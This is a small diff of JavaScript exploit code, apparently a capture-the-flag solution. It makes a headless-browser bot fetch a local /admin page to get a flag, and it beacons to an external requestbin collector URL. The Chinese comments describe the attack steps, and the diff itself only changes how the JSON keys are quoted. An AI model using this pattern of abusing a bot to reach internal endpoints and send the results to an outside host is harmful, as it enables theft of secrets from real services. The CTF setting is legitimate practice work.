@@ -10,7 +10,7 @@
     const YOUR_RECEIVE_URL = "http://www.requestbin.cn:80/1fn11tu1"; // 例：https://en8x0z9p37r.x.pipedream.net/
     fetch(YOUR_RECEIVE_URL+'?id='+Math.random());
     // ###########################################################################
-    const param = {url:'http://127.0.0.1:3000/admin'};
+    const param = {"url":"http://127.0.0.1:3000/admin"};
     // 核心：访问/admin获取环境变量的FLAG，Puppeteer同域无跨域，直接解析JSON
     fetch('/visit',{
       method: 'POST', // 必须指定为 POST
